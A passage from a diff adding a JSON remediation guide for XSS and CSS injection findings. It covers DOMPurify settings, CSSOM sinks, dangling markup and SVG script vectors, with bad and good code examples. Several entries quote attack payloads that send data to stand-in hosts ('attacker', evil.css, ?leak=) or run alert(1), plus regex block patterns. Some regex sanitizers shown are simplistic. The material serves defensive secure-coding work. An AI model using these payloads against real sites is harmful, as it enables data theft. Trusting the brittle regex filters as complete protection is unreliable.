+        "Add CSP `script-src`/`style-src` to block inline protocol handlers."
+      ]
+    },
+    "sanitizer_config_allow_data_attr": {
+      "headline": "Restrict ALLOW_DATA_ATTR when sanitizing user HTML.",
+      "detail": "Allowing arbitrary data-* attributes can enable DOM clobbering or attribute-based selector attacks when combined with client-side JS that reads dataset.  Disable ALLOW_DATA_ATTR unless you explicitly need it, and validate the values.",
+      "code_example": "DOMPurify.sanitize(html, {ALLOW_DATA_ATTR: false});\n",
+      "primary_cwe": "CWE-79",
+      "also_consider": [
+        "Audit JS that reads element.dataset for unsafe sinks."
+      ]
+    },
+    "sanitizer_config_keep_content": {
+      "headline": "Set KEEP_CONTENT to false for untrusted HTML.",
+      "detail": "With KEEP_CONTENT=true, the sanitizer strips tags but keeps their text content.  For some contexts (e.g. <style>, <script> text) this can still yield executable content after mutation.  Set KEEP_CONTENT=false for fully untrusted input.",
+      "code_example": "DOMPurify.sanitize(html, {KEEP_CONTENT: false});\n",
+      "primary_cwe": "CWE-79",
+      "also_consider": [
+        "Test with <style> and <noscript> payloads."
+      ]
+    },
+    "sanitizer_output_to_innerhtml": {
+      "headline": "Avoid assigning sanitized output to innerHTML.",
+      "detail": "Even with a current sanitizer version, assigning sanitized HTML to innerHTML is the canonical mXSS vector: a future mXSS bypass will execute immediately.  Prefer textContent for plain text, or use Trusted Types + a sanitizer policy so the DOM sink is mediated.",
+      "code_example": "// RISKY -- future mXSS bypass executes\nel.innerHTML = DOMPurify.sanitize(userInput);\n\n// GOOD -- Trusted Types policy wraps the sanitizer\nconst policy = trustedTypes.createPolicy('san', {\n  createHTML: s => DOMPurify.sanitize(s)\n});\nel.innerHTML = policy.createHTML(userInput);\n",
+      "primary_cwe": "CWE-79",
+      "also_consider": [
+        "Add CSP `require-trusted-types-for 'script'` to enforce mediation."
+      ]
+    },
+    "unsanitized_innerhtml_user_source": {
+      "headline": "Sanitize user input before assigning to innerHTML.",
+      "detail": "The page assigns a user-controlled value (location.hash, document.referrer, fetch response, etc.) directly to innerHTML without any sanitization.  This is a guaranteed DOM-XSS sink.  Either switch to textContent, or pass the value through a current sanitizer (DOMPurify) before assignment.",
+      "code_example": "// BAD\nel.innerHTML = location.hash.slice(1);\n\n// GOOD -- textContent for plain text\nel.textContent = decodeURIComponent(location.hash.slice(1));\n\n// GOOD -- sanitize for HTML\nel.innerHTML = DOMPurify.sanitize(location.hash.slice(1));\n",
+      "primary_cwe": "CWE-79",
+      "also_consider": [
+        "Enable Trusted Types so this sink throws by default."
+      ]
+    },
+    "css_font_face_exfil": {
+      "headline": "Do not allow user-controlled @font-face rules with unicode-range.",
+      "detail": "An @font-face rule with unicode-range and an external src:url() causes the browser to fire one HTTP request per matching character to the specified URL.  An attacker who can inject this rule can exfiltrate secrets character-by-character without executing any JavaScript -- bypassing CSP script-src.  Never allow user input to control the src or unicode-range of @font-face.  If user-controlled CSS is required, sanitize it with a CSS parser allowlist that strips @font-face, @import, and url() pointing to external origins.",
+      "code_example": "// BAD -- user input reaches @font-face\nstyleEl.textContent = userInput; // can contain @font-face\n\n// GOOD -- allowlist CSS properties only\nconst safe = sanitizeCss(userInput, {\n  allowedAtRules: [],  // block @font-face, @import\n  allowedProperties: ['color', 'font-size', 'margin'],\n});\nstyleEl.textContent = safe;\n",
+      "primary_cwe": "CWE-79",
+      "also_consider": [
+        "Deploy a strict CSP that blocks external font-src origins.",
+        "Use Trusted Types to prevent dynamic <style> injection."
+      ]
+    },
+    "css_selector_exfil": {
+      "headline": "Block user-controlled CSS selectors targeting input[value].",
+      "detail": "A CSS rule like input[value^=\"a\"] { background: url(attacker) } fires an HTTP request when a form input's value starts with 'a'. Chaining many such rules leaks the full secret (e.g. CSRF token, password autofill) to the attacker.  This is the classic 'CSS keylogger' attack.  Never allow user input to control CSS selectors that target secret-bearing elements.  Sanitize user CSS with a property+selector allowlist.",
+      "code_example": "// BAD -- user input reaches a stylesheet as-is\nsheet.insertRule(userInput, 0); // can target input[value]\n\n// GOOD -- strip attribute selectors on inputs\nconst safe = sanitizeCss(userInput, {\n  blockedSelectorPatterns: [/input\\[/i, /\\[value/i],\n});\n",
+      "primary_cwe": "CWE-79",
+      "also_consider": [
+        "Add autocomplete=off and type=password on secret inputs.",
+        "Set CSP style-src to 'self' only (blocks external url())."
+      ]
+    },
+    "css_import_injection": {
+      "headline": "Block @import from loading external stylesheets.",
+      "detail": "@import url(https://attacker/evil.css) loads an attacker-controlled stylesheet that can mount CSS keylogger and data-exfiltration attacks.  Never allow user input to contain @import.  Sanitize user-supplied CSS with an at-rule allowlist that strips @import.",
+      "code_example": "/* BAD */\n/* userInput contains: @import url(https://evil/x.css); */\nel.style.cssText = userInput;\n\n// GOOD -- strip @import via a CSS sanitizer\nel.style.cssText = sanitizeCss(userInput, {allowedAtRules: []});\n",
+      "primary_cwe": "CWE-79",
+      "also_consider": [
+        "Set CSP style-src to 'self' (blocks @import from other origins)."
+      ]
+    },
+    "css_javascript_uri": {
+      "headline": "Strip javascript: URIs from CSS url() values.",
+      "detail": "url(javascript:alert(1)) in CSS executes script in legacy IE/old Edge.  Modern browsers ignore javascript: in CSS url(), but mixed-environment deployments are still at risk.  Sanitize user-supplied CSS to strip javascript:, vbscript:, and data: URIs from url() values.",
+      "code_example": "// GOOD -- block dangerous URI schemes in CSS\nfunction sanitizeCssUrl(css) {\n  return css.replace(/url\\(\\s*['\"]?\\s*(?:javascript|vbscript|data):/gi,\n                     'url(blocked:');\n}\n",
+      "primary_cwe": "CWE-79",
+      "also_consider": [
+        "Upgrade to a CSP that blocks inline styles."
+      ]
+    },
+    "css_expression": {
+      "headline": "Remove CSS expression() (IE < 11 script execution).",
+      "detail": "expression() in CSS executes arbitrary JavaScript in IE < 11. Strip expression( from all user-supplied CSS.  IE < 11 is end-of-life but may still be present in legacy environments.",
+      "code_example": "// GOOD\ncss = css.replace(/expression\\s*\\(/gi, 'blocked(');\n",
+      "primary_cwe": "CWE-79",
+      "also_consider": [
+        "Enforce a CSP that blocks inline styles."
+      ]
+    },
+    "css_moz_binding": {
+      "headline": "Remove -moz-binding (legacy Firefox XBL script execution).",
+      "detail": "-moz-binding: url(attacker.xml#xss) loads an XBL binding that can execute script in Firefox < 62.  Strip -moz-binding from user-supplied CSS.  Modern Firefox removed this feature but legacy versions are still in use.",
+      "code_example": "// GOOD\ncss = css.replace(/-moz-binding\\s*:/gi, 'blocked:');\n",
+      "primary_cwe": "CWE-79",
+      "also_consider": [
+        "Enforce a CSP that blocks external stylesheets."
+      ]
+    },
+    "css_behavior": {
+      "headline": "Remove CSS behavior:url() (IE HTC script execution).",
+      "detail": "behavior:url(xss.htc) loads an HTC component that can execute script in IE < 11.  Strip behavior: from user-supplied CSS.",
+      "code_example": "// GOOD\ncss = css.replace(/behavior\\s*:/gi, 'blocked:');\n",
+      "primary_cwe": "CWE-79",
+      "also_consider": [
+        "Enforce a CSP that blocks inline styles."
+      ]
+    },
+    "css_template_reflection": {
+      "headline": "Encode user input before interpolating into <style> blocks.",
+      "detail": "A server-side template placeholder ({{ }}, <%= %>, ${ }) inside a <style> block means user input is interpolated into CSS context.  If the value contains </style>, it escapes to HTML and enables XSS.  Encode user input for CSS context: escape <\", '\\\\', and control characters.  Better yet, avoid interpolating user input into <style> entirely -- use CSS custom properties (variables) set via a safe API.",
+      "code_example": "/* BAD -- server template */\n<style>body { color: {{ userColor }}; }</style>\n\n/* GOOD -- escape < and \" in the value */\n<style>body { color: {{ userColor|css_escape }}; }</style>\n\n// GOOD -- use a CSS custom property via JS\ndocument.body.style.setProperty('--user-color', safeValue);\n",
+      "primary_cwe": "CWE-79",
+      "also_consider": [
+        "Use a strict CSP style-src that blocks inline <style>."
+      ]
+    },
+    "cssom_cssText": {
+      "headline": "Sanitize user input before assigning to element.style.cssText.",
+      "detail": "element.style.cssText = userInput is a CSSOM sink that can inject any CSS property including @import, url(javascript:), and expression().  Never assign raw user input to cssText.  Set individual style properties via the typed CSSOM (element.style.color = ...) or sanitize the input with a CSS allowlist parser.",
+      "code_example": "// BAD\nel.style.cssText = userInput;\n\n// GOOD -- set individual properties\nel.style.color = safeColor;\nel.style.fontSize = safeSize;\n",
+      "primary_cwe": "CWE-79",
+      "also_consider": [
+        "Enable Trusted Types to guard CSSOM sinks."
+      ]
+    },
+    "cssom_background": {
+      "headline": "Sanitize user input before assigning to element.style.background.",
+      "detail": "element.style.background = userInput can inject url() pointing to an attacker server (data exfiltration) or javascript: URI (legacy IE).  Validate that user input is a safe color or gradient value, not a url() expression.",
+      "code_example": "// BAD\nel.style.background = userInput;\n\n// GOOD -- validate against a color/gradient allowlist\nif (/^(#[0-9a-f]{3,8}|rgb|linear-gradient\\()/.test(userInput)) {\n  el.style.background = userInput;\n}\n",
+      "primary_cwe": "CWE-79",
+      "also_consider": [
+        "Block url() in user-supplied CSS values."
+      ]
+    },
+    "cssom_insertrule": {
+      "headline": "Sanitize user input before passing to CSSStyleSheet.insertRule().",
+      "detail": "CSSStyleSheet.insertRule(userInput, 0) can inject any CSS rule including @import, @font-face exfiltration gadgets, and CSS keylogger selectors.  Never pass raw user input to insertRule.  Parse the input CSS and allowlist only safe properties and selectors.",
+      "code_example": "// BAD\nsheet.insertRule(userInput, 0);\n\n// GOOD -- sanitize first\nconst safe = sanitizeCss(userInput, {\n  allowedAtRules: [],\n  blockedSelectorPatterns: [/input\\[/i],\n});\nsheet.insertRule(safe, 0);\n",
+      "primary_cwe": "CWE-79",
+      "also_consider": [
+        "Enable Trusted Types to guard CSSOM sinks."
+      ]
+    },
+    "css_dynamic_exfil_gadget": {
+      "headline": "Do not build CSS selectors from user input in JavaScript.",
+      "detail": "The page builds CSS dynamically in JavaScript that combines a secret-input selector (input[value=...]) with an external url() callback.  This is a CSS keylogger pattern that exfiltrates form field values to an attacker server without executing JavaScript.  Refactor to avoid building CSS from user input; if dynamic styling is needed, use CSS custom properties set via a safe API.",
+      "code_example": "// BAD -- builds CSS keylogger from user input\nvar s = document.createElement('style');\ns.textContent = 'input[value^=\"' + char + '\"] { background:url(attacker) }';\n\n// GOOD -- use CSS custom properties (no selector injection)\ndocument.body.style.setProperty('--user-accent', safeColor);\n",
+      "primary_cwe": "CWE-79",
+      "also_consider": [
+        "Set CSP style-src to 'self' (blocks external url() callbacks)."
+      ]
+    },
+    "cssom_liststyle": {
+      "headline": "Sanitize user input before assigning to element.style.listStyle.",
+      "detail": "element.style.listStyle = userInput can inject url() pointing to an attacker server for data exfiltration.  Validate input is a safe keyword (disc, circle, decimal) not a url().",
+      "code_example": "// GOOD -- allowlist list-style keywords\nif (/^(disc|circle|square|decimal|none)$/.test(userInput)) {\n  el.style.listStyle = userInput;\n}\n",
+      "primary_cwe": "CWE-79",
+      "also_consider": [
+        "Block url() in user-supplied CSS values."
+      ]
+    },
+    "cssom_content": {
+      "headline": "Sanitize user input before assigning to element.style.content.",
+      "detail": "element.style.content = userInput can inject arbitrary generated content, enabling phishing and UI redress attacks.  Ensure the value is a quoted string, not an expression.",
+      "code_example": "// GOOD -- wrap in quotes\nel.style.content = '\"' + userInput.replace(/\"/g, '\\\\\"') + '\"';\n",
+      "primary_cwe": "CWE-79",
+      "also_consider": [
+        "Avoid user-controlled generated content entirely."
+      ]
+    },
+    "cssom_cursor": {
+      "headline": "Sanitize user input before assigning to element.style.cursor.",
+      "detail": "element.style.cursor = userInput can inject url() for data exfiltration (legacy IE also supported cursor: url(javascript:)).  Allowlist cursor keywords only.",
+      "code_example": "// GOOD\nif (/^(pointer|default|wait|text|crosshair)$/.test(userInput)) {\n  el.style.cursor = userInput;\n}\n",
+      "primary_cwe": "CWE-79",
+      "also_consider": [
+        "Block url() in user-supplied CSS values."
+      ]
+    },
+    "cssom_insertrule_import": {
+      "headline": "Never pass @import to CSSStyleSheet.insertRule().",
+      "detail": "insertRule() with @import loads an attacker-controlled stylesheet that can mount CSS keylogger and data-exfiltration attacks.  Strip @import from any user input before passing to insertRule().",
+      "code_example": "// GOOD -- strip @import before insertRule\nvar safe = userInput.replace(/@import\\b/gi, '/* blocked */');\nsheet.insertRule(safe, 0);\n",
+      "primary_cwe": "CWE-79",
+      "also_consider": [
+        "Set CSP style-src to 'self'."
+      ]
+    },
+    "cssom_adoptedsheets": {
+      "headline": "Sanitize user input before assigning to document.adoptedStyleSheets.",
+      "detail": "document.adoptedStyleSheets = [sheet] accepts constructable stylesheets.  If the sheet's CSSOM rules were built from user input, this is a CSS injection sink.  Ensure all rules added to constructable stylesheets are sanitized.",
+      "code_example": "// GOOD -- sanitize before replacing\nconst sheet = new CSSStyleSheet();\nsheet.replaceSync(sanitizeCss(userInput, {allowedAtRules: []}));\ndocument.adoptedStyleSheets = [sheet];\n",
+      "primary_cwe": "CWE-79",
+      "also_consider": [
+        "Enable Trusted Types to guard CSSOM sinks."
+      ]
+    },
+    "dangling_markup_risk": {
+      "headline": "Encode quotes in user input reflected into HTML attributes.",
+      "detail": "User input reflected into an attribute context (href, src, action, etc.) without encoding the quote characters enables dangling markup injection.  An attacker injects a payload like \"><img src=\"https://attacker/?leak= with an unclosed quote; the browser then captures all subsequent DOM content (CSRF tokens, session IDs, hidden input values) as part of the URL and sends it to the attacker's server.  This bypasses CSP script-src because no JavaScript executes -- the HTML parser itself performs the exfiltration via a resource load.  Encode both double and single quotes in user input before placing it into any attribute value, and place sensitive tokens (CSRF, session) upstream of reflection points so they cannot be captured.",
+      "code_example": "# BAD -- reflects user input into href without encoding quotes\n<a href=\"{user_input}\">link</a>\n\n# GOOD -- encode quotes (and < > &) for attribute context\nimport html\nsafe = html.escape(user_input, quote=True)  # encodes \" ' < > &\n<a href=\"{safe}\">link</a>\n\n# GOOD -- place CSRF token BEFORE any reflected content so\n# dangling markup cannot capture it\n<input type=\"hidden\" name=\"csrf\" value=\"{token}\">  # upstream\n<a href=\"{safe}\">link</a>  # downstream reflection",
+      "primary_cwe": "CWE-79",
+      "also_consider": [
+        "Deploy CSP with frame-ancestors and base-uri restrictions.",
+        "Move sensitive tokens (CSRF, session) to httpOnly cookies instead of DOM hidden inputs.",
+        "Use frame-src 'none' and img-src 'self' in CSP to block dangling-markup exfiltration channels."
+      ]
+    },
+    "dangling_markup_potential": {
+      "headline": "Audit pages with sensitive DOM data and user-controllable URL attributes.",
+      "detail": "The page contains sensitive data in the DOM (CSRF token, hidden input value, session meta tag) AND has URL-bearing attributes (href/src/action).  If any of these attributes reflect user input, a dangling markup attack could exfiltrate the sensitive data.  Verify that all URL attributes are either static or properly quote-encoded, and consider moving sensitive tokens out of the DOM.",
+      "code_example": "# GOOD -- encode quotes in any reflected attribute value\nimport html\nsafe = html.escape(user_input, quote=True)\n<a href=\"{safe}\">link</a>\n\n# GOOD -- prefer httpOnly cookies over hidden inputs for tokens\n# (tokens in cookies are not in the DOM and cannot be captured\n#  by dangling markup)",
+      "primary_cwe": "CWE-79",
+      "also_consider": [
+        "Set CSP img-src 'self' to block dangling-markup exfiltration via <img>.",
+        "Review all href/src/action attributes for user-input reflection."
+      ]
+    },
+    "svg_xss_svg_script": {
+      "headline": "Strip <script> elements from SVG input.",
+      "detail": "SVG <script> elements execute JavaScript in the same origin as the embedding page.  Many HTML sanitizers (incorrectly) treat <script> inside SVG as inert because the SVG namespace is allow-listed.  Remove all <script> elements from SVG input before serving or embedding the SVG, and configure your sanitizer to recognize the SVG namespace.",
+      "code_example": "# BAD -- sanitizer allows <script> in SVG namespace\nsvg = user_input  # <svg><script>alert(1)</script></svg>\nhtml = f'<div>{svg}</div>'  # script executes!\n\n# GOOD -- use a sanitizer that strips <script> from SVG\nfrom nh3 import clean\nsafe_svg = clean(user_input, tags={'svg','path','rect','circle'},\n               attributes={'*': {'viewBox','width','height','fill'}})\n# Or strip <script> manually before sanitizing\nimport re\nno_script = re.sub(r'<script[\\s\\S]*?</script>', '', svg, flags=re.I)\n\n# GOOD -- serve SVG with Content-Type: image/svg+xml AND a\n# restrictive CSP that blocks inline script.",
+      "primary_cwe": "CWE-79",
+      "also_consider": [
+        "Set CSP script-src 'self' (no 'unsafe-inline') to block SVG inline scripts.",
+        "Use a SVG-aware sanitizer (DOMPurify with SVG support, nh3, or sanitize-svg).",
+        "Serve SVG with Content-Disposition: attachment to prevent inline rendering."
+      ]
+    },
+    "svg_xss_svg_foreignobject_script": {
+      "headline": "Strip <foreignObject> and its HTML children from SVG input.",
+      "detail": "<foreignObject> embeds arbitrary HTML inside SVG, including <script>, <iframe>, and event handlers.  This is the canonical SVG-to-HTML escape hatch.  Remove <foreignObject> elements entirely from any user-supplied SVG; there is no safe subset of HTML that can be embedded inside SVG via <foreignObject>.",
+      "code_example": "# BAD -- allows <foreignObject> with embedded <script>\nsvg = user_input  # <svg><foreignObject><script>alert(1)</script></foreignObject></svg>\n\n# GOOD -- strip <foreignObject> entirely\nimport re\nsafe = re.sub(r'<foreignObject[\\s\\S]*?</foreignObject>', '', svg,\n              flags=re.I | re.DOTALL)\n\n# GOOD -- use a SVG sanitizer that removes <foreignObject>\nfrom nh3 import clean\nsafe = clean(svg, tags={'svg','path','rect','circle','text'},\n               attributes={'*': {'viewBox','fill','stroke'}})",
+      "primary_cwe": "CWE-79",
+      "also_consider": [
+        "Block <foreignObject> in your sanitizer's allow-list.",
+        "Apply CSP sandbox to isolate SVG content from the embedding page."
+      ]
+    },
+    "svg_xss_svg_use_jsuri": {
+      "headline": "Validate scheme on <use href> attributes.",
+      "detail": "<use href=\"javascript:...\"> executes JavaScript when the use element is rendered.  Validate that all href/xlink:href attributes on <use> elements use only http(s): or relative URLs; reject javascript:, data:, and other dangerous schemes.",
+      "code_example": "# BAD -- allows javascript: URI on <use>\nsvg = '<svg><use xlink:href=\"javascript:alert(1)\"/></svg>'\n\n# GOOD -- validate scheme before rendering\nfrom urllib.parse import urlparse\ndef is_safe_url(u):\n    p = urlparse(u)\n    return p.scheme in ('', 'http', 'https')\n\n# GOOD -- sanitize with nh3 / DOMPurify, restricting href schemes",
+      "primary_cwe": "CWE-79",
+      "also_consider": [
+        "Block <use> with external href entirely if cross-document references are not required.",
+        "Apply CSP default-src 'none' to SVG documents served standalone."
+      ]
+    },
+    "svg_xss_svg_set_event": {
+      "headline": "Block SMIL <set>/<animate> from writing to event handlers.",
+      "detail": "SMIL <set> and <animate> elements can write to ANY attribute via attributeName, including event handlers (onload, onbegin) and href.  When the animation fires, the browser evaluates the new attribute value as JavaScript.  This bypasses CSP script-src because SMIL is not gated by CSP in older browsers.  Remove <set>, <animate>, <animateTransform>, and <animateMotion> elements from user-supplied SVG, or filter attributeName to a safe allow-list (fill, stroke, opacity, transform -- never on* event handlers or href).",
+      "code_example": "# BAD -- allows SMIL to set onload attribute\nsvg = '<svg><set attributeName=\"onload\" to=\"alert(1)\"/></svg>'\n\n# GOOD -- strip all SMIL animation elements\nimport re\nsmil_re = re.compile(r'<(?:set|animate|animateTransform|animateMotion)[\\s\\S]*?/(?:set|animate|animateTransform|animateMotion)?>', re.I)\nsafe = smil_re.sub('', svg)\n\n# GOOD -- allow SMIL only with a safe attributeName allow-list\nALLOWED_ATTRS = {'fill','stroke','opacity','transform','cx','cy','r'}",
+      "primary_cwe": "CWE-79",
+      "also_consider": [
+        "Block SMIL elements entirely in user-supplied SVG (recommended).",
+        "If SMIL is required, validate attributeName against a strict allow-list.",
+        "Apply CSP script-src 'none' to SVG documents to mitigate SMIL-based execution."
+      ]
+    },
+    "svg_xss_svg_animate_event": {
+      "headline": "Block SMIL <animate> from writing to event handlers.",
+      "detail": "Same vector as <set>, but using <animate> which can also interpolate between values.  The attributeName attribute can target any attribute, including onload and href.  Remove <animate> elements from user-supplied SVG.",
+      "code_example": "# Strip <animate>, <animateTransform>, <animateMotion> from SVG\nimport re\nsafe = re.sub(r'<animate(?:Transform|Motion)?[\\s\\S]*?/>', '', svg,\n              flags=re.I)",
+      "primary_cwe": "CWE-79",
+      "also_consider": [
+        "Block SMIL elements entirely in user-supplied SVG.",
+        "Validate attributeName against a safe allow-list if SMIL is required."
+      ]
+    },
+    "svg_xss_svg_smil_onbegin": {
+      "headline": "Strip onbegin/onend/onrepeat event handlers from SMIL elements.",
+      "detail": "SMIL animation elements fire begin/end/repeat events during their lifecycle.  An inline onbegin=\"alert(1)\" handler executes when the animation starts -- no user interaction required.  Strip all on* event handler attributes from SMIL elements, or remove the SMIL elements entirely.",
+      "code_example": "# Strip on* attributes from SMIL elements\nimport re\nsmil_re = re.compile(r'<(set|animate|animateTransform|animateMotion)([^>]*)>', re.I)\ndef strip_handlers(m):\n    tag, attrs = m.group(1), m.group(2)\n    attrs = re.sub(r'\\s+on\\w+\\s*=\\s*[\"\\'][^\"\\']*[\"\\']', '', attrs, flags=re.I)\n    return f'<{tag}{attrs}>'\nsafe = smil_re.sub(strip_handlers, svg)",
+      "primary_cwe": "CWE-79",
+      "also_consider": [
+        "Block SMIL elements entirely in user-supplied SVG (recommended).",
+        "Apply CSP script-src 'none' to mitigate SMIL-based event handler execution."
+      ]
+    },
+    "svg_xss_svg_a_jsuri": {
+      "headline": "Validate scheme on SVG <a href> attributes.",
+      "detail": "<a> inside SVG supports both href and xlink:href with javascript: URIs.  Requires a click in most browsers.  Validate that all href attributes on <a> elements use only http(s): or relative URLs.",
+      "code_example": "# Strip <a> elements with javascript: href from SVG\nimport re\nsafe = re.sub(r'<a[^>]*href\\s*=\\s*[\"\\']javascript:[^>]*>[\\s\\S]*?</a>',\n              '', svg, flags=re.I)",
+      "primary_cwe": "CWE-79",
+      "also_consider": [
+        "Validate href schemes against an allow-list (http, https, mailto, relative).",
+        "Apply CSP default-src 'none' to standalone SVG documents."
+      ]
+    },
+    "svg_xss_svg_image_jsuri": {
+      "headline": "Validate scheme on <image href> attributes.",
+      "detail": "<image> inside SVG historically accepted javascript: URIs in legacy browsers.  Validate that all href attributes on <image> elements use only http(s): or relative URLs.",
+      "code_example": "# Strip <image> elements with javascript: href from SVG\nimport re\nsafe = re.sub(r'<image[^>]*href\\s*=\\s*[\"\\']javascript:[^>]*/>',\n              '', svg, flags=re.I)",
+      "primary_cwe": "CWE-79",
+      "also_consider": [
+        "Validate href schemes against an allow-list.",
+        "Block <image> with external href if not required."
+      ]
+    },
+    "svg_xss_svg_handler": {
+      "headline": "Strip <handler> and <listener> elements from SVG input.",
+      "detail": "<handler> is an SVG 1.1 element that binds JavaScript to an event via the ev:event attribute.  <listener> (SVG 1.2) is similar to addEventListener in XML form.  Remove both elements entirely from user-supplied SVG.",
+      "code_example": "# Strip <handler> and <listener> elements\nimport re\nsafe = re.sub(r'<(?:handler|listener)[\\s\\S]*?/(?:handler|listener)>',\n              '', svg, flags=re.I | re.DOTALL)",
+      "primary_cwe": "CWE-79",
+      "also_consider": [
+        "Block <handler> and <listener> in your sanitizer's allow-list.",
+        "Apply CSP script-src 'none' to mitigate handler-based execution."
+      ]
+    },
+    "svg_xss_svg_onload": {
+      "headline": "Strip on* event handlers from SVG elements.",
+      "detail": "SVG elements fire onload when rendered (no click required for <svg>/<image>).  Any inline onload=\"alert(1)\" handler executes immediately.  Strip all on* event handler attributes from SVG elements.",
+      "code_example": "# Strip on* attributes from all SVG elements\nimport re\n# Remove on*=\"...\" attributes from any tag\nsafe = re.sub(r'\\s+on\\w+\\s*=\\s*[\"\\'][^\"\\']*[\"\\']', '', svg,\n              flags=re.I)",
+      "primary_cwe": "CWE-79",
+      "also_consider": [
+        "Apply CSP script-src 'self' (no 'unsafe-inline') to block inline event handlers.",
+        "Use a sanitizer that strips event handler attributes from SVG."
+      ]
+    },
+    "svg_xss_svg_style_expression": {
+      "headline": "Strip expression() / -moz-binding / behavior from SVG <style>.",
+      "detail": "SVG <style> is the same as HTML <style> but inside the SVG namespace.  CSS injection vectors (expression, -moz-binding, behavior:url) work the same way.  Strip these properties from any <style> content inside SVG, or remove <style> entirely from user-supplied SVG.",
+      "code_example": "# Strip <style> from SVG entirely (recommended)\nimport re\nsafe = re.sub(r'<style[\\s\\S]*?</style>', '', svg,\n              flags=re.I | re.DOTALL)",
+      "primary_cwe": "CWE-79",
+      "also_consider": [
+        "Block <style> in user-supplied SVG entirely.",
+        "Apply CSP style-src 'self' to block inline styles in SVG."
+      ]
+    },
+    "svg_xss_svg_text_jsuri": {
+      "headline": "Validate scheme on SVG <text href> attributes.",
+      "detail": "<text href=\"javascript:...\"> is clickable in some browsers. Validate that all href attributes on <text> elements use only http(s): or relative URLs.",
+      "code_example": "# Strip <text> elements with javascript: href from SVG\nimport re\nsafe = re.sub(r'<text[^>]*href\\s*=\\s*[\"\\']javascript:[^>]*>[\\s\\S]*?</text>',\n              '', svg, flags=re.I | re.DOTALL)",
+      "primary_cwe": "CWE-79",
+      "also_consider": [
+        "Validate href schemes against an allow-list.",
+        "Block <text> with href if not required."
+      ]
+    },
+    "svg_xss_svg_discard_jsuri": {
+      "headline": "Strip <discard> elements with javascript: href from SVG.",
+      "detail": "<discard> (SVG 2) removes a target element at a specified time.  With a javascript: href, this becomes an XSS vector. Remove <discard> elements from user-supplied SVG.",
+      "code_example": "# Strip <discard> elements from SVG\nimport re\nsafe = re.sub(r'<discard[^>]*/?>', '', svg, flags=re.I)",
+      "primary_cwe": "CWE-79",
+      "also_consider": [
+        "Block <discard> in your sanitizer's allow-list.",
+        "Apply CSP script-src 'none' to mitigate discard-based execution."
+      ]
+    },
+    "svg_xss_svg_use_external": {
+      "headline": "Restrict <use href> to same-origin or block external references.",
+      "detail": "<use href=\"https://external.svg#id\"> loads content from an external SVG document.  If the external SVG contains <script>, it executes in the embedding page's origin (for same-origin references; cross-origin is blocked in modern browsers but same-origin is not).  Restrict <use href> to same-origin URLs or block external references entirely.",
+      "code_example": "# Validate that <use href> is same-origin or relative\nfrom urllib.parse import urlparse\ndef is_same_origin(u, page_origin):\n    p = urlparse(u)\n    if not p.scheme and not p.netloc:\n        return True  # relative URL\n    return f'{p.scheme}://{p.netloc}' == page_origin",
+      "primary_cwe": "CWE-79",
+      "also_consider": [
+        "Block <use> with external href entirely if cross-document references are not required.",
+        "Apply CSP default-src 'self' to SVG documents."
+      ]
+    },
+    "svg_xss_svg_foreignobject": {
+      "headline": "Audit <foreignObject> usage in SVG input.",
+      "detail": "<foreignObject> embeds arbitrary HTML inside SVG, including <script>, <iframe>, and event handlers.  Its presence is a strong signal that the developer is intentionally mixing HTML and SVG.  Audit each <foreignObject> for child sinks and consider removing the element entirely if HTML embedding is not required.",
+      "code_example": "# Strip <foreignObject> entirely (recommended)\nimport re\nsafe = re.sub(r'<foreignObject[\\s\\S]*?</foreignObject>', '', svg,\n              flags=re.I | re.DOTALL)",
+      "primary_cwe": "CWE-79",
+      "also_consider": [
+        "If <foreignObject> is required, sanitize its HTML children with a strict allow-list.",
+        "Apply CSP sandbox to isolate SVG content from the embedding page."
+      ]
+    },
+    "svg_xss_svg_script_external": {
+      "headline": "Block <script> with external href in SVG.",
+      "detail": "<script xlink:href=\"https://attacker/x.js\"> loads and executes remote JavaScript.  Remove all <script> elements from SVG input, regardless of whether they contain inline content or external references.",
+      "code_example": "# Strip all <script> elements from SVG\nimport re\nsafe = re.sub(r'<script[\\s\\S]*?</script>', '', svg,\n              flags=re.I | re.DOTALL)\n# Also strip self-closing <script .../> variants\nsafe = re.sub(r'<script[^>]*/>', '', safe, flags=re.I)",
+      "primary_cwe": "CWE-79",
+      "also_consider": [
+        "Set CSP script-src 'self' (no 'unsafe-inline') to block external scripts in SVG.",
+        "Use a SVG-aware sanitizer that strips <script> in the SVG namespace."
+      ]
+    },
+    "svg_xss_svg_script_jsuri": {
+      "headline": "Block <script> with javascript: URI in SVG.",
+      "detail": "<script xlink:href=\"javascript:...\"> is a rare but valid SVG 1.1 vector.  Remove all <script> elements from SVG input.",
+      "code_example": "# Strip all <script> elements from SVG (covers all script variants)\nimport re\nsafe = re.sub(r'<script[\\s\\S]*?(?:</script>|/>)', '', svg,\n              flags=re.I | re.DOTALL)",
+      "primary_cwe": "CWE-79",
+      "also_consider": [
+        "Set CSP script-src 'none' for SVG documents to block all script execution."
+      ]
+    },
+    "svg_xss_svg_foreignobject_iframe": {
+      "headline": "Strip <iframe> from <foreignObject> in SVG.",
+      "detail": "<foreignObject> with an embedded <iframe> can load arbitrary content (including javascript: URIs).  Remove <foreignObject> entirely, or strip <iframe> elements from its HTML children.",
+      "code_example": "# Strip <foreignObject> entirely (recommended)\nimport re\nsafe = re.sub(r'<foreignObject[\\s\\S]*?</foreignObject>', '', svg,\n              flags=re.I | re.DOTALL)",
+      "primary_cwe": "CWE-79",
+      "also_consider": [
+        "Apply CSP frame-src 'none' to block <iframe> in SVG <foreignObject>."
+      ]
+    },
+    "svg_xss_svg_foreignobject_event": {
+      "headline": "Strip event handlers from <foreignObject> HTML children.",
+      "detail": "<foreignObject> with inline event handlers (onload, onclick, etc.) in its HTML children executes JavaScript.  Strip all on* attributes from HTML elements inside <foreignObject>, or remove <foreignObject> entirely.",
+      "code_example": "# Strip on* attributes from all elements inside <foreignObject>\nimport re\nfo_re = re.compile(r'(<foreignObject[\\s\\S]*?>)([\\s\\S]*?)(</foreignObject>)', re.I | re.DOTALL)\ndef strip_handlers(m):\n    open_tag, body, close_tag = m.group(1), m.group(2), m.group(3)\n    body = re.sub(r'\\s+on\\w+\\s*=\\s*[\"\\'][^\"\\']*[\"\\']', '', body, flags=re.I)\n    return open_tag + body + close_tag\nsafe = fo_re.sub(strip_handlers, svg)",
+      "primary_cwe": "CWE-79",
+      "also_consider": [
+        "Apply CSP script-src 'self' (no 'unsafe-inline') to block inline event handlers."
+      ]
+    },
+    "svg_xss_svg_foreignobject_jsuri": {
+      "headline": "Block javascript: URIs inside <foreignObject> HTML.",
